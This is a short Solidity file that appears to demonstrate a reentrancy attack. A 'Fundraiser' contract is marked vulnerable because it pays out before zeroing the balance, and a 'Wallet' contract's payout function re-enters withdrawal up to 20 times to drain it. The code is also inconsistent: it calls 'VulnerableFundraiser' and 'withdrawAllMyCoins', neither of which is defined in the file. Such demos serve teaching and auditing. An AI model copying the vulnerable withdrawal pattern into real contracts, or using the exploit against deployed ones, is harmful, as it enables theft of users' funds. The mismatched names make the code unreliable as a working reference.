pragma solidity ^0.4.24;

contract Fundraiser {
    mapping(address=>uint) balances;

    // VULNERABLE
    function withdrawCoins(){
        uint withdrawAmount = balances[msg.sender];
        Wallet wallet = Wallet(msg.sender);
        wallet.payout.value(withdrawAmount)();

        // this line is not reached before the next recursion!!
        balances[msg.sender] = 0;
    }

    function getBalance() constant returns (uint) {
        return address(this).balance;
    }

    function contribute() payable {
        balances[msg.sender] += msg.value;
    }

    function() payable {

    }
}



contract Wallet {

    Fundraiser fundraiser;
    uint recursion=20;

    function Wallet(address fundraiserAddress) {
        fundraiser = VulnerableFundraiser(fundraiserAddress);
    }

    function contribute(uint amount) {
        fundraiser.contribute.value(amount)();
    }

    function withdraw(){
        fundraiser.withdrawAllMyCoins();
    }

    function getBalance() constant returns (uint) {
        return address(this).balance;
    }

    function payout() payable {
        // exploit
        if(recursion>0) {
            recursion--;
            fundraiser.withdrawAllMyCoins();
        }
    }

    function() payable {

    }
}